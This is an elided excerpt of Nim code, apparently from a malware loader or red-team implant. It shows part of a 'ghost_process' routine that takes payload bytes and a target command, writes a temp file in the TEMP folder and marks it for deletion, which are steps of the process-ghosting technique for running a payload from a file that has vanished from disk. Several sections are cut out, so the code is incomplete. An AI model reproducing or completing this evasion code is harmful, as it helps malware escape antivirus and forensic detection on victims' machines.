...
proc ghost_process*(payload_bytes: seq[byte], target_cmd: string): HANDLE =
    ...
    # Use environment-aware TEMP folder instead of hardcoded C:\Windows\Temp
    let temp_folder = getEnv("TEMP")
    let temp_file = if temp_folder != "": temp_folder & "\\ghost_" & $seed & ".tmp" 
                    else: "C:\\Windows\\Temp\\ghost_" & $seed & ".tmp"
    
    # log_debug("[Ghosting] Temp file: " & temp_file)
    ...
    var fdi: FILE_DISPOSITION_INFO
    fdi.DeleteFile = TRUE
    if SetFileInformationByHandle(hFile, fileDispositionInfo, addr fdi, cast[DWORD](sizeof(fdi))) == 0:
        # log_debug("[Ghosting] Failed to set delete disposition: " & $GetLastError())
        discard
    else:
        # log_debug("[Ghosting] File marked for deletion.")
        discard
